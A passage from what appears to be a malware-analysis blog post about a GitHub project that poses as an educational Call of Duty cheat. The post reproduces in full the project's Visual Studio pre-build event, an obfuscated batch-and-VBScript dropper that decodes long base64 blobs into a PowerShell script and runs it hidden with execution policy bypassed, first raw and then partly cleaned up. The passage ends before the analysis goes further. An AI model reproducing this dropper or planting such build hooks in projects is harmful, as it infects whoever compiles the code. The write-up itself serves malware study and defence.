---
title: Infection Pre Compilation
topic: MalRevE
---

Looking for malware hidden in open source projects, we encounter an interesting case. This project claims to be a video game cheat that was developed for the purpose of learning about reverse engineering. 

Further, instead of releasing a binary, it wants the end user to compile the program themselves. This is a bit clever, as you would assume a cheat created for educational purposes wouldn't ship a binary for ethical purposes, instead having a tiny barrier of entry for other developers that wanted to use or study the tool.

![Github repo]({{ site.baseurl }}/assets/images/MalAl-IBC/github-repo.png)

Looking through the repository, we find something interesting the `.vcxproj` file located at:
```
Call-of-Duty-Modern-Warfare-3-MW3-Hack-Cheat-Aimbot-Esp-Unban-Hwid-Unlocks-GunLVL/ESP & Aimbot/ESP & Aimbot.vcxproj
```

This snippet in the `vbproj` sticks out at us:
```
<PreBuildEvent>
      <Command>@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;tempDir=%25TEMP%25\script&quot;&#xD;&#xA;mkdir &quot;%25tempDir%25&quot; 2&gt;nul&#xD;&#xA;echo odasuaudgagi = &quot;JFIgPSAiPT1BZHVKSEk3MEhJN2tTYmxSM2M1TmxPNjAxY2xSWGRpbG1jMFJYUWx4V2FHNXlUSjVTYmxSM2M1TjFXZ0kzYmkxQ0l1Vkdaa2xHUzZvVFh6VkdkMUpXYXlSSGRCVkdicFprTFBsa0x0VkdkemwzVWJoQ0lsVkhiaFpWTGdNWFowVm5ZcEpIZDBGRUlsMVdZTzFDSXdSQ0lvUlhZUTFDSTVSbmNsQjNieUJWYmxSWFN0UVhaVEJ5T3AwV1owTlhlVHBqT2ROWFowVm5ZcEpIZDBGVVpzbG1SdThVU3UwV1owTlhlVHRGSXk5bVl0QWlibFJHWnBoa082MDFjbFJYZGlsbWMwUlhRbHhXYUc1eVRKNVNibFIzYzVOMVdvQVNaMXhXWVcxQ0l6VkdkMUpXYXlSSGRCQlNadEZtVHRBeWJrQUNhMEZHVXRBU2UwSlhadzltY1ExV1owbFVMMFYyVWdzVEtvVTJjdkIzY3BSa0wwNVdacHgyUWlWMmRrQXlPcDhHSmd3U2RrZ1Nac2xtUmtGMmJzNTJkdlJrTDA1V1pweDJRaVYyZGtBeU8wNVdacHgyUWlWMlZ1UVhaTzVTYmxSM2M1TkZJME5XWnFKMlR0Y1haT0JTUGdRbmJsbEdiREpXWjNSQ0k3SVNaNFZtTDZkaklnZ0dkaEJGWnNsR2FEMUNJd1JDSW9SWFlRMUNJb1JYWVExaWJwOW1TZzBESXZSQ0k3SVNaNFZtTHlwM052RTJMbkozYnVBWGE2MXlOdWMzZDM5eUw2TUhjMFJIYWlBU1BnVUhKZ3NUWmpKM2JHMUNJd1JDSW9SWFlRMUNJNUozYjBOV1p5bEdSZ1VHYzVSVmJsUlhTdEFTYmxSWFN0Y1haT0J5ZWdrU0tpVUdlbDVpZTN3RmNrSUNJb1JYWVExQ2R6VkdWb0FDZHY1V0xvQWlacEJ5T2lBWGFhNVdaMlYyY2NGR2RoUlViaEozWnZKSFVjcHpRaUFTUGdBSEpnc1RmZ1FYYWhkVkxnNFdaa1JXYUlCU1pzbEhkVGQzYms1V2FYMUNJbkpYWWtBQ2R6bEdUMDVXWnRWM1p5RlVMZ0FYYWFOSEpnZ0dkaEJWWnNsbVJ0QXljelYyWXZKSFV0UW5jaFIzVWdzakk1MUNJWEJuVGtBR2QzQVZjTVpqS0xkV0k1RVVKeUltSmVOalVvQlhMZ0lDWXc5R0ppQTJidEFpSWdoMll5RkdKaUFHSTRKQ0k5QXlaeUZHSmdzaklsaFhadW8zTmNCWGFhNVdaMlYyY2NGR2RoUlViaEozWnZKSFVjcHpRaUFTUGdBWGFhTkhKZ2tDY3ZSU1huNVdheVIzY2JCQ0xvTm1jaFJTWG41V2F5UjNjYmhDSXRGbWNoQkhJN0JDZDRWRUl1OVdhME5tYjFaR0k3MEhJOXRISW9OR2RoTkdJOUJDVmpWR1prQWlicDltYXRBaWJ5VkhkbEpISTlCeU9wZzJRd1JDSXRBaWNoaDJZa2dTWHlGR2FqdEZJOUFTWHBSeVdVTldaa1JDSTcwRmEwZG1ibHhrTHdNVFE0UkNJbEFTYWtzRk16RUVla0FTUGdnMlF3UkNJNzBWYWtzRlZqNVdaa0FTUGdJWFlvTkdKZ3NISXBzeUtwUkNJN2dHZG41V1pNNUNWajVXWmtBQ2RzMUNJcFJDSTdBREk5QVNha2dDSXk5bVpnc0RhMGRtYmx4a0xVTm1ibFJDSWR0bGNoaDJZZ1EzWWxwbVlQMXlkbDVFSTlBQ1ZqVkdaa0F5T3BJMFl1VkdKb2NtYnBKSGRUUlhaSDVDT0dSVlY2b1RYbjVXYWs5Mll1VmtMMGhYWlU1U2JsUjNjNU4xV2cwRElVTm1ibFJDSTdrQ05pUkhlMFJDS241V2F5UjNVMFlUWnpGbVF0OW1jR3BqT2RSbmNsWm5idk5rTHRWR2R6bDNVYkJTUGdJMFl1VkdKZ3NISTVKSGRna0NNekVFZWswMVp1bG1jME4zV2d3Q05pUkhlMFJTWG41V2F5UjNjYmhDSXRGbWNoQkhJN0J5WWxSRUl1OVdhME5tYjFaR0k3SVNmc1FDWVh0VFlpdG5mQTVHT05ORE9za2pZd0ZuSWcwRElqOW1jd1JDSTdJQ2Q2OVZNNTFXUDJnV0wwdDJRMFZsSWcwRElqOTJieUJISmdzVGZnMEhJN01HYjBKV2U2ZEdkdkZHYnRCeWVnZzJZMEYyWWcwSEk5QlNmZ3NEYTBCRmJtUkNJdFZHZEoxU1oyOVdibEpGSTdCU0tvUkhVc1pHSmdnR2RoQlZMME5YWlVoQ0ltbEdJOUJ5T3VWR1prbEdTZ1VHYjVSM1UzOUdadWwyVnRBQ1U0VkdKZ2dHZGhCVlpzbG1SdEF5Y3pWMll2SkhVdFFuY2hSM1Vnc0hJcEFGZWxSQ0lvUlhZUTFDZHpWR1ZvQWlacEJ5T2lVR2VsNWljbFJIYnBaRWFqSlhZbE5sSWdBRmQ0VkdKZ2dHZGhCVkx1bDJiS0JTUGdBRmVsUkNJN0FGZDRWR0pnQTNidEFDYTBCRmJtUkNJb05tY2gxQ0kwaFhSZ3NUS2lSQ0lzZ0dkUXhtWmtneWNsUlhlQ3hHYkJWR2RwSjNWNm9UWGx4V2FHNXlUSjVTYmxSM2M1TjFXZ3NUS2lvM051SUNJckFpYzBORlp1SkhKb0FDY3RSSEpnZ0dkaEJWTHVsMmJLQlNQZ2dHZFF4bVprQXllZ2tDTWdRM1p0QUNhMGRtYmx4a0xpUkNLZ1lXYWdzVEtWUkNLaFJYWUVSV1l2eG1iMzlHUnVNRUpnMERJaVJDSTdCU2V5UkhJN2tDTXhBQ0x3Z3ladWxtYzBOblkxTmxMcElpSWd3aUl1d2xJZ1UyWWh4R2NsSlhMZ2tDS2wxV1lPVkdicFpVYnZSbWJoSkZkbGRrTzYwRmEwRkdVdThVU3UwV1owTlhlVHRGS2cwREl5UjNVazVtY2tBeU9wRWpkazVtY2tnQ0l3MUdka0FDYTBGR1V0NFdhdnBFSTlBQ1UwaFhaa0F5T3BnQ2EwRkdVdzFXWlVSWFpIcGpPZGhHZGhCbExQbGtMdFZHZHpsM1ViQlNQZ0FYYjBSQ0k3a0NLbjVXYXlSM1V2UmxMcGdD&quot; &gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo odasuauuudgagi = &quot;eVIzY2lWM1V1a2lJaUFDTGk0Q1hpQVNaakZHYndWbWN0QVNLb1VXYmg1VVpzbG1SdDlHWnVGbVUwVjJSNm9UWG9SWFlRNXlUSjVTYmxSM2M1TjFXb0FTUGdJSGRUUm1ieVJDSTdrU00yUm1ieVJDS2dBWGIwUkNJb1JYWVExaWJwOW1TZzBESVFSSGVsUkNJN2tDS29SWFlRQlhibFJGZGxka082MEZhMEZHVXU4VVN1MFdaME5YZVR0Rkk5QUNjdFJISmdzVEtvY21icEpIZFQ5R1Z1a0NLa2xXZEhkWFpPcGpPZFJXYTFka0x0VkdkemwzVWJCU1BnRWpkazVtY2tBeU8wUkdKZzBESXpOV1prUkNJOUJ5T2o5bWN3UkNJd01UUTQxQ0l6NUdjekpISmdRalkwaEhkdEF5WWxSRUk5QUNka1JDSTdCU0t6NUdjekpISm9BaVpwQnlPbmhHWnpGR0pna21jVjFDSWs5R2EwVldUME5YWlMxU1pyOW1kdWxFSTlBeWN1QjNjeVJDSTdNMmJ2Skhja0FDTXpFRWV0QUNabWxIZGhaSEpnUWpZMGhIZHRBeVlsUkVJOUF5Wm9SMmNoUkNJN0lTU0xoRGRESm5jM3gyVDRNM1FFQjNkR3QwY3pSa2V3ZEhNTGhEYkRKWE4zTm1SMmNYWVBOSGNEeFVjM1IwVGo1R1I2VnpkRjkwWXdOa2UyYzNUUE5tY0RobE1zTmtaeUFIUjJWemR6c1VUeFIwTXlkbklnMERJa1pXZTBGbWRrQXllZ2tuYzBCeWVnUTNjd0JpYnZsR2RqNVdkbUJ5TzlCU2Znc0RkekJISTdCQ2FqUlhZakJTZmcwSEk5QnlPb1JIVXNaR0pnMFdaMGxVTGxaM2J0Vm1VZ3NISXBnR2RReG1aa0FDYTBGR1V0UTNjbFJGS2dZV2FnMEhJNzRXWmtSV2FJQlNac2xIZFRkM2JrNVdhWDFDSVFoWFprQUNhMEZHVWx4V2FHMUNJek5YWmo5bWNRMUNkeUZHZFRCeWVna0NVNFZHSmdnR2RoQlZMME5YWlVoQ0ltbEdJN0lTWjRWbUx5Vkdkc2xtUm9ObWNoVjJVaUFDVTBoWFprQUNhMEZHVXQ0V2F2cEVJOUFDVTRWR0pnc0RVMGhYWmtBQ2N2MUNJb1JIVXNaR0pnZzJZeUZXTGdRSGVGQnlPcGtuWWtBQ0xvUkhVc1pHSm9NWFowbG5Rc3hXUWxSWGF5ZGxPNjBWWnNsbVJ1OFVTdTBXWjBOWGVUdEZJN2tpSTZkakxpQXlLZ0lIZFRSbWJ5UkNLZ0FYYjBSQ0lvUlhZUTFpYnA5bVNnMERJb1JIVXNaR0pnc0hJcEFESTBkV0xnZ0dkbjVXWk01U2VpUkNLZ1lXYWdzVEt6Tldaa1JDS2hSWFlFUldZdnhtYjM5R1J1UW5ibGxHYmpSQ0k5QVNlaVJDSTdRbmJsbEdiREpXWlg1Q2RsNWtMdFZHZHpsM1VnUTNZbHBtWVAxeWRsNUVJOUFDZHVWV2FzTkdKZ3NUS3dFRElzQURLbjVXYXlSM2NpVjNVdWtpSWlBQ0xpNENYaUFTWmpGR2J3Vm1jdEFTS29VV2JoNVVac2xtUnQ5R1p1Rm1VMFYyUjZvVFhvUlhZUTV5VEo1U2JsUjNjNU4xV29BU1BnSUhkVFJtYnlSQ0k3a1NNMlJtYnlSQ0tnQVhiMFJDSW9SWFlRMWlicDltU2cwRElRUkhlbFJDSTdrQ0tvUlhZUUJYYmxSRmRsZGtPNjBGYTBGR1V1OFVTdTBXWjBOWGVUdEZJOUFDY3RSSEpnc1RLb2NtYnBKSGRUOUdWdWtDS2tsV2RIZFhaT3BqT2RSV2ExZGtMdFZHZHpsM1ViQlNQZ0VqZGs1bWNrQXlPMFJHSmcwREl6Tldaa1JDSTlCeU9qOW1jd1JDSXdNVFE0MUNJejVHY3pKSEpnUWpZMGhIZHRBeVlsUkVJOUFDZGtSQ0k3QlNLejVHY3pKSEpvQWlacEJ5T25aMmNrQVNheVZWTGdRMmJvUlhaTlIzY2xKVkxsdDJiMjVXU2cwREl6NUdjekpISmdzell2OW1jd1JDSXdNVFE0MUNJNnQyYWtBQ05pUkhlMDFDSWpWR1JnMERJbloyY2tBeU9pMFRQblYzUVlWemRJOUVPdk5FVDNjM1VQaGpiRHhrTjNKMVROSjNRekUzZGk5MGNxTmtZMmNYVVBOSGREQlZjM04wVDQ4R1J6VXpkT3QwY3VORVQyY25XUGhqY0RobE1zTmtaeUFIUjJWemR6c1VUeFIwTXlkbklnMERJNnQyYWtBeWVna25jMEJ5ZWdRbmJ5QmlidmxHZGo1V2RtQnlPOUJ5WWtBaWJ5VkhkbEpISTdBU0tvVTJjdngyUXVNWFp5UkNJN0FTS29VMmN2eDJRdUkzY2tBeU9na0NLazVXUnZSRlpoVm1VdUkzY2tBU1BnTUdKZ3NESXBrQ0t0RldaeVIzVWxObmJ2QjNjbEpGZGxka0x6Vm1ja2dpY2xSV1lsSlZiaFZtYzBObExQbGtMdFZHZHpsM1VnUTNZbHBtWVAxeWRsNUVJOUFpY3pSQ0k3QVNLb1UyY3U5R2N6Vm1VMFYyUnVJSEpnMERJelZtY2tBeU9nUUhKZzBESTBWM2JsMVdhVTVpY2tBeU9na1Nka2dTWjBGV1p5TmtPNjBGZHpWV2R4Vm1VaVYyVnVRWFpPNVNibFIzYzVOMVdnMERJeVJDSTdBU0t3QURNMUVESTlBQ2RrMEZkdWwyV2d3U2RrMDFadWxtYzBOM1dvQVNiaEpYWXdCeWVnTUZSZzQyYnBSM1l1Vm5aIjsgJHR4dCA9ICRSLlRvQ2hhckFycmF5KCk7IFthcnJheV06OlJldmVyc2UoJHR4dCk7ICRibmIgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC1qb2luICR0eHQpKTsgJGV4cCA9ICJJbnZva2UtRXhwcmVzc2lvbiI7IE5ldy1BbGlhcyAtTmFtZSBwV04gLVZhbHVlICRleHAgLUZvcmNlOyBwV04gJGJuYg==&quot; &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo odasuauudgagi = &quot;WnBWM1IzVm1UNm9UWGtsV2RINVNibFIzYzVOMVdnMERJeFlIWnVKSEpna1NWazAxWnVsbWMwTjNXZ3d5UWswRmR1Vldhc05rWWxkbEwwVm1UdTBXWjBOWGVUdEZLZzBXWXlGR2Nnc0hJR2huUkVCaWJ2bEdkajVXZG1CeU85QlNmZ3NEZHpCSEk3QkNhalJYWWpCU2ZnMEhJOUJ5T29SSFVzWkdKZzBXWjBsVUxsWjNidFZtVWdzSElwZ0dkUXhtWmtBQ2EwRkdVdFEzY2xSRktnWVdhZzBISTc0V1prUldhSUJTWnNsSGRUZDNiazVXYVgxQ0lRaFhaa0FDYTBGR1VseFdhRzFDSXpOWFpqOW1jUTFDZHlGR2RUQnllZ2tDVTRWR0pnZ0dkaEJWTDBOWFpVaENJbWxHSTdJU1o0Vm1MeVZHZHNsbVJvTm1jaFYyVWlBQ1UwaFhaa0FDYTBGR1V0NFdhdnBFSTlBQ1U0VkdKZ3NEVTBoWFprQUNjdjFDSW9SSFVzWkdKZ2cyWXlGV0xnUUhlRkJ5T3BrbllrQUNMb1JIVXNaR0pvTVhaMGxuUXN4V1FsUlhheWRsTzYwVlpzbG1SdThVU3UwV1owTlhlVHRGSTdraUk2ZGpMaUF5S2dJSGRUUm1ieVJDS2dBWGIwUkNJb1JYWVExaWJwOW1TZzBESW9SSFVzWkdKZ3NISXBBREkwZFdMZ2dHZG41V1pNNVNlaVJDS2dZV2Fnc1RLek5XWmtSQ0toUlhZRVJXWXZ4bWIzOUdSdVFuYmxsR2JqUkNJOUFTZWlSQ0k3UW5ibGxHYkRKV1pYNUNkbDVrTHRWR2R6bDNVZ1EzWWxwbVlQMXlkbDVFSTlBQ2R1Vldhc05HSmdzVEt3RURJc0FES241V2F5UjNjaVYzVXVraUlpQUNMaTRDWGlBU1pqRkdid1ZtY3RBU0tvVVdiaDVVWnNsbVJ0OUdadUZtVTBWMlI2b1RYb1JYWVE1eVRKNVNibFIzYzVOMVdvQVNQZ0lIZFRSbWJ5UkNJN2tTTTJSbWJ5UkNLZ0FYYjBSQ0lvUlhZUTFpYnA5bVNnMERJUVJIZWxSQ0k3a0NLb1JYWVFCWGJsUkZkbGRrTzYwRmEwRkdVdThVU3UwV1owTlhlVHRGSTlBQ2N0UkhKZ3NUS29jbWJwSkhkVDlHVnVrQ0trbFdkSGRYWk9wak9kUldhMWRrTHRWR2R6bDNVYkJTUGdFamRrNW1ja0F5TzBSR0pnMERJek5XWmtSQ0k5QnlPajltY3dSQ0l3TVRRNDFDSXo1R2N6SkhKZ1FqWTBoSGR0QXlZbFJFSTlBQ2RrUkNJN0JTS3o1R2N6SkhKb0FpWnBCeU9uWjJja0FTYXlWVkxnUTJib1JYWk5SM2NsSlZMbHQyYjI1V1NnMERJejVHY3pKSEpnc3pZdjltY3dSQ0l3TVRRNDFDSXNWM2RvUkNJMElHZDRSWExnTVdaRUJTUGdjbVp6UkNJN0lTUDlFVWNESlhOM1oyVE5KV2JMMTBiRUJWYzNKMlRqOUdSaUozZHY5RU9uUkVWMmNuZFAxRWFFQkZjM2QzVE45R1JtRjNkcUpVTjNGMVN6QkhSM1V6ZDU1a04zUnpTejkyUVFkemRTOTBZd05rWjJjM1VQaGpjRGhsTXNOa1p5QUhSMlZ6ZHpzVVR4UjBNeWRuSWcwRElzVjNkb1JDSTdCU2V5UkhJN0J5WXNSblk1cDNaMDlXWXMxR0l1OVdhME5tYjFaR0k3MEhJOUJ5T3BnU1p6OUdjemxHUnVRbmJsbEdiREpXWjNSQ0k3QlNlc3hXWXVsbVpnMEhJN01HYjBKV2U2ZEdkdkZHYnRCeWVnZzJZMEYyWWcwSEk5QnlPeVpHSmdJMmRrQWlSNFpFUmdzell2Skhja0FTWHdzbGJzUkNJalZHUmcwREl5WkdKZ3NISXBBREkwZFdMZ2dHZG41V1pNNWlic1JDS2dZV2Fnc2pJdUJtSWdRWGFzQjNjdEFpWmpSR0pnMERJdXhHSmdzVEttZEdKb01GUmcwREltTkdaa0F5TzA1V1pweDJRaVYyVnVRWFpPNVNibFIzYzVORkkwTldacUoyVHRjWFpPQlNQZ0kyZGtBeU9qOTJieUJISmdBek1CaFhMZ1EyY2tBQ05pUkhlMDFDSWpWR1JnMERJbWRHSmdzakk5VVZOM2R6U2pGM1FJUnpkWTlVVDBSRVYxYzNVTGhqYkVoa04zTlhNeGRuU1BoamJEQlZjM1YxVE5CM1FNRjNkRTkwWXVSa2UxY1hSUE5HY0Rwbk4zOTBUakozUVlKRGJEWm1Nd1JrZDFjM01MMVVjRU5qYzNKQ0k5QUNaelJDSTdCU2V5UkhJN0J5Y25SSGNnNDJicFIzWXVWblpnc1RmZzBISTdNM1owQkhJN0JDYWpSWFlqQlNmZzBISTlCeU9vUkhVc1pHSmcwV1owbFVMbFozYnRWbVVnc0hJcGdHZFF4bVprQUNhMEZHVXRRM2NsUkZLZ1lXYWcwSEk3NFdaa1JXYUlCU1pzbEhkVGQzYms1V2FYMUNJUWhYWmtBQ2EwRkdVbHhXYUcxQ0l6TlhaajltY1ExQ2R5RkdkVEJ5ZWdrQ1U0VkdKZ2dHZGhCVkwwTlhaVWhDSW1sR0k3SVNaNFZtTHlWR2RzbG1Sb05tY2hWMlVpQUNVMGhYWmtBQ2EwRkdVdDRXYXZwRUk5QUNVNFZHSmdzRFUwaFhaa0FDY3YxQ0lvUkhVc1pHSmdnMll5RldMZ1FIZUZCeU9wa25Za0FDTG9SSFVzWkdKb01YWjBsblFzeFdRbFJYYXlkbE82MFZac2xtUnU4VVN1MFdaME5YZVR0Rkk3a2lJNmRqTGlBeUtnSUhkVFJtYnlSQ0tnQVhiMFJDSW9SWFlRMWlicDltU2cwRElvUkhVc1pHSmdzSElwQURJMGRXTGdnR2RuNVdaTTVTZWlSQ0tnWVdhZ3NUS3pOV1prUkNLaFJYWUVSV1l2eG1iMzlHUnVRbmJsbEdialJDSTlBU2VpUkNJN1FuYmxsR2JESldaWDVDZGw1a0x0VkdkemwzVWdRM1lscG1ZUDF5ZGw1RUk5QUNkdVZXYXNOR0pnc1RLd0VESXNBREtuNVdh&quot; &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo dajyugda78dauydajda = odasuaudgagi ^&amp; odasuauudgagi ^&amp; odasuauuudgagi &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Set base64Decoder = CreateObject(&quot;MSXml2.DOMDocument.6.0&quot;).createElement(&quot;base64&quot;) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo base64Decoder.DataType = &quot;bin.base64&quot; &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo base64Decoder.Text = dajyugda78dauydajda &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo decodedData = base64Decoder.NodeTypedValue &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo outputFile = &quot;%25tempDir%25\decode.ps1&quot; &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Set outFile = fso.CreateTextFile(outputFile, True) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo outFile.Write BinaryToString(decodedData) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo outFile.Close &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Set shell = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo shell.Run &quot;powershell.exe -ExecutionPolicy Bypass -File &quot; ^&amp; outputFile, 0, False &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Function BinaryToString(Binary) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Dim RS, L &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Set RS = CreateObject(&quot;ADODB.Recordset&quot;) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo L = LenB(Binary) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo If L ^&gt; 0 Then &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS.Fields.Append &quot;m&quot;, 201, L &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS.Open &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS.AddNew &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS(&quot;m&quot;).AppendChunk Binary &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS.Update &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo BinaryToString = RS(&quot;m&quot;).GetChunk(L) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Else &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo BinaryToString = &quot;&quot; &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo End If &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo End Function &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;endlocal</Command>
    </PreBuildEvent>
```

Let's first clean this up. We replace all `&#xD;&#xA;` with `\r\n`, `%25` with `%`, `&gt;` with `>`, and `&quot;` with `"`, and `&amp;` with `&`.

We now get something much more readable:
```
<PreBuildEvent>
      <Command>@echo off
setlocal
set "tempDir=%TEMP%\script"
mkdir "%tempDir%" 2>nul
echo odasuaudgagi = "JFIgPSAiPT1BZHVKSEk3MEhJN2tTYmxSM2M1TmxPNjAxY2xSWGRpbG1jMFJYUWx4V2FHNXlUSjVTYmxSM2M1TjFXZ0kzYmkxQ0l1Vkdaa2xHUzZvVFh6VkdkMUpXYXlSSGRCVkdicFprTFBsa0x0VkdkemwzVWJoQ0lsVkhiaFpWTGdNWFowVm5ZcEpIZDBGRUlsMVdZTzFDSXdSQ0lvUlhZUTFDSTVSbmNsQjNieUJWYmxSWFN0UVhaVEJ5T3AwV1owTlhlVHBqT2ROWFowVm5ZcEpIZDBGVVpzbG1SdThVU3UwV1owTlhlVHRGSXk5bVl0QWlibFJHWnBoa082MDFjbFJYZGlsbWMwUlhRbHhXYUc1eVRKNVNibFIzYzVOMVdvQVNaMXhXWVcxQ0l6VkdkMUpXYXlSSGRCQlNadEZtVHRBeWJrQUNhMEZHVXRBU2UwSlhadzltY1ExV1owbFVMMFYyVWdzVEtvVTJjdkIzY3BSa0wwNVdacHgyUWlWMmRrQXlPcDhHSmd3U2RrZ1Nac2xtUmtGMmJzNTJkdlJrTDA1V1pweDJRaVYyZGtBeU8wNVdacHgyUWlWMlZ1UVhaTzVTYmxSM2M1TkZJME5XWnFKMlR0Y1haT0JTUGdRbmJsbEdiREpXWjNSQ0k3SVNaNFZtTDZkaklnZ0dkaEJGWnNsR2FEMUNJd1JDSW9SWFlRMUNJb1JYWVExaWJwOW1TZzBESXZSQ0k3SVNaNFZtTHlwM052RTJMbkozYnVBWGE2MXlOdWMzZDM5eUw2TUhjMFJIYWlBU1BnVUhKZ3NUWmpKM2JHMUNJd1JDSW9SWFlRMUNJNUozYjBOV1p5bEdSZ1VHYzVSVmJsUlhTdEFTYmxSWFN0Y1haT0J5ZWdrU0tpVUdlbDVpZTN3RmNrSUNJb1JYWVExQ2R6VkdWb0FDZHY1V0xvQWlacEJ5T2lBWGFhNVdaMlYyY2NGR2RoUlViaEozWnZKSFVjcHpRaUFTUGdBSEpnc1RmZ1FYYWhkVkxnNFdaa1JXYUlCU1pzbEhkVGQzYms1V2FYMUNJbkpYWWtBQ2R6bEdUMDVXWnRWM1p5RlVMZ0FYYWFOSEpnZ0dkaEJWWnNsbVJ0QXljelYyWXZKSFV0UW5jaFIzVWdzakk1MUNJWEJuVGtBR2QzQVZjTVpqS0xkV0k1RVVKeUltSmVOalVvQlhMZ0lDWXc5R0ppQTJidEFpSWdoMll5RkdKaUFHSTRKQ0k5QXlaeUZHSmdzaklsaFhadW8zTmNCWGFhNVdaMlYyY2NGR2RoUlViaEozWnZKSFVjcHpRaUFTUGdBWGFhTkhKZ2tDY3ZSU1huNVdheVIzY2JCQ0xvTm1jaFJTWG41V2F5UjNjYmhDSXRGbWNoQkhJN0JDZDRWRUl1OVdhME5tYjFaR0k3MEhJOXRISW9OR2RoTkdJOUJDVmpWR1prQWlicDltYXRBaWJ5VkhkbEpISTlCeU9wZzJRd1JDSXRBaWNoaDJZa2dTWHlGR2FqdEZJOUFTWHBSeVdVTldaa1JDSTcwRmEwZG1ibHhrTHdNVFE0UkNJbEFTYWtzRk16RUVla0FTUGdnMlF3UkNJNzBWYWtzRlZqNVdaa0FTUGdJWFlvTkdKZ3NISXBzeUtwUkNJN2dHZG41V1pNNUNWajVXWmtBQ2RzMUNJcFJDSTdBREk5QVNha2dDSXk5bVpnc0RhMGRtYmx4a0xVTm1ibFJDSWR0bGNoaDJZZ1EzWWxwbVlQMXlkbDVFSTlBQ1ZqVkdaa0F5T3BJMFl1VkdKb2NtYnBKSGRUUlhaSDVDT0dSVlY2b1RYbjVXYWs5Mll1VmtMMGhYWlU1U2JsUjNjNU4xV2cwRElVTm1ibFJDSTdrQ05pUkhlMFJDS241V2F5UjNVMFlUWnpGbVF0OW1jR3BqT2RSbmNsWm5idk5rTHRWR2R6bDNVYkJTUGdJMFl1VkdKZ3NISTVKSGRna0NNekVFZWswMVp1bG1jME4zV2d3Q05pUkhlMFJTWG41V2F5UjNjYmhDSXRGbWNoQkhJN0J5WWxSRUl1OVdhME5tYjFaR0k3SVNmc1FDWVh0VFlpdG5mQTVHT05ORE9za2pZd0ZuSWcwRElqOW1jd1JDSTdJQ2Q2OVZNNTFXUDJnV0wwdDJRMFZsSWcwRElqOTJieUJISmdzVGZnMEhJN01HYjBKV2U2ZEdkdkZHYnRCeWVnZzJZMEYyWWcwSEk5QlNmZ3NEYTBCRmJtUkNJdFZHZEoxU1oyOVdibEpGSTdCU0tvUkhVc1pHSmdnR2RoQlZMME5YWlVoQ0ltbEdJOUJ5T3VWR1prbEdTZ1VHYjVSM1UzOUdadWwyVnRBQ1U0VkdKZ2dHZGhCVlpzbG1SdEF5Y3pWMll2SkhVdFFuY2hSM1Vnc0hJcEFGZWxSQ0lvUlhZUTFDZHpWR1ZvQWlacEJ5T2lVR2VsNWljbFJIYnBaRWFqSlhZbE5sSWdBRmQ0VkdKZ2dHZGhCVkx1bDJiS0JTUGdBRmVsUkNJN0FGZDRWR0pnQTNidEFDYTBCRmJtUkNJb05tY2gxQ0kwaFhSZ3NUS2lSQ0lzZ0dkUXhtWmtneWNsUlhlQ3hHYkJWR2RwSjNWNm9UWGx4V2FHNXlUSjVTYmxSM2M1TjFXZ3NUS2lvM051SUNJckFpYzBORlp1SkhKb0FDY3RSSEpnZ0dkaEJWTHVsMmJLQlNQZ2dHZFF4bVprQXllZ2tDTWdRM1p0QUNhMGRtYmx4a0xpUkNLZ1lXYWdzVEtWUkNLaFJYWUVSV1l2eG1iMzlHUnVNRUpnMERJaVJDSTdCU2V5UkhJN2tDTXhBQ0x3Z3ladWxtYzBOblkxTmxMcElpSWd3aUl1d2xJZ1UyWWh4R2NsSlhMZ2tDS2wxV1lPVkdicFpVYnZSbWJoSkZkbGRrTzYwRmEwRkdVdThVU3UwV1owTlhlVHRGS2cwREl5UjNVazVtY2tBeU9wRWpkazVtY2tnQ0l3MUdka0FDYTBGR1V0NFdhdnBFSTlBQ1UwaFhaa0F5T3BnQ2EwRkdVdzFXWlVSWFpIcGpPZGhHZGhCbExQbGtMdFZHZHpsM1ViQlNQZ0FYYjBSQ0k3a0NLbjVXYXlSM1V2UmxMcGdD" > "%tempDir%\script.vbs"
